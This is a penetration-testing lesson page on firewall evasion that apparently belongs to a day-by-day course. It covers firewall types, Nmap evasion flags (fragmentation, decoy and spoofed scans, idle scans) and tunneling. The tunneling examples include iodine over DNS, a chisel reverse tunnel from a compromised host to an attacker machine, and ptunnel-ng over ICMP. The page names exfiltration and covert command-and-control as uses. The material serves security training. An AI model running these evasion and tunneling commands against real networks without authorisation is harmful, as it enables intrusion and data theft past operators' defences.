---
title: "Firewall Evasion"
topic: "firewall-evasion"
tags: [firewall, evasion, nmap, tunneling, dns-tunneling, bypass]
difficulty: advanced
day: 15
layout: default
parent: Topics
nav_order: 15
---

# Firewall Evasion

## What You Will Learn
- What firewalls are and the different types
- How to evade firewalls during a penetration test using Nmap flags
- What tunneling is and how it is used to bypass firewalls
- How DNS and HTTP tunneling work in practice

## What Is It?

A **firewall** is a network security device that monitors and controls incoming and outgoing traffic based on predefined security rules. It acts as a barrier between a trusted internal network and untrusted external networks (like the internet).

**Firewall evasion** is the technique of bypassing these rules to reach a protected system or exfiltrate data.

## Why It Matters

During a penetration test, you will frequently encounter firewalls that block your scans and exploits. Understanding how to evade them is essential for realistic security assessments. Defenders also need to understand evasion techniques in order to write better firewall rules.

## Key Concepts

### Types of Firewalls

- **Packet Filtering Firewall**: Checks packets against rules based on IP address, port, and protocol. Simple and fast, but easy to evade.
- **Stateful Inspection Firewall**: Tracks the state of network connections and can detect unusual patterns like half-open connections.
- **Application Layer Firewall (WAF)**: Inspects the content of traffic at the application level (HTTP, FTP, DNS). Harder to evade.
- **Next-Generation Firewall (NGFW)**: Combines stateful inspection with deep packet inspection and application awareness.

### Common Evasion Techniques

- **Packet fragmentation**: Split packets into small pieces so the firewall cannot reassemble them to detect the attack.
- **Source IP spoofing**: Use decoy IPs to confuse the firewall about the origin of a scan.
- **Using allowed ports**: Route malicious traffic through port 80 (HTTP) or 443 (HTTPS), which firewalls typically allow.
- **Tunneling**: Encapsulate blocked protocols inside an allowed protocol (e.g., DNS tunneling, ICMP tunneling, HTTP tunneling).
- **Slow scanning**: Spread scans over a long period of time to avoid rate-based detection rules.
- **Idle/Zombie scanning**: Use a third-party host (zombie) to perform a scan, completely hiding your real IP.

## Hands-On

### Nmap Firewall Evasion Flags

```bash
# Fragment packets to avoid deep packet inspection
nmap -f <target>

# Use 10 random decoy IPs to hide your real IP
nmap -D RND:10 <target>

# Scan from a spoofed source IP
nmap -S <spoofed_ip> <target>

# Use a specific source port (e.g., 53 for DNS — often allowed through firewalls)
nmap --source-port 53 <target>

# Paranoid timing — very slow scan to avoid rate limiting
nmap -T0 <target>

# Idle/zombie scan — completely hides your IP address
nmap -sI <zombie_host> <target>

# Use a specific MTU (packet size) for fragmentation
nmap --mtu 8 <target>
```

### DNS Tunneling

DNS tunneling encodes data inside DNS queries. Since most firewalls allow DNS traffic on port 53, this can be used to exfiltrate data or create a covert command-and-control channel.

```bash
# iodine — tunnels IPv4 traffic over DNS
# Server side (attacker controls a domain with DNS delegation)
iodined -f 10.0.0.1 tunnel.yourdomain.com

# Client side (on the victim network)
iodine -f tunnel.yourdomain.com
```

### HTTP Tunneling with Chisel

Chisel wraps your traffic in HTTP to bypass firewalls that only allow web traffic.

```bash
# On the attacker machine
chisel server --reverse --port 8080

# On the compromised machine behind the firewall
chisel client <attacker_ip>:8080 R:9000:127.0.0.1:22
```

This exposes port 22 (SSH) of the internal machine on port 9000 of the attacker's machine, tunneled through HTTP on port 8080.

### ICMP Tunneling

```bash
# ptunnel-ng — tunnel TCP over ICMP (ping)
# Server side
ptunnel-ng

# Client side
ptunnel-ng -p <server_ip> -lp 8000 -da <destination_ip> -dp 22
```

## Resources

- [Nmap Firewall Evasion Guide](https://nmap.org/book/man-bypass-firewalls-ids.html)
- [TryHackMe — Red Team Firewalls](https://tryhackme.com/room/redteamfirewalls)
- [Chisel Tunneling Tool](https://github.com/jpillora/chisel)
- [iodine DNS Tunnel](https://code.kryo.se/iodine/)
- [DNS Tunneling Explained](https://www.infosecmatter.com/dns-tunneling-what-is-it-and-how-to-detect-it/)
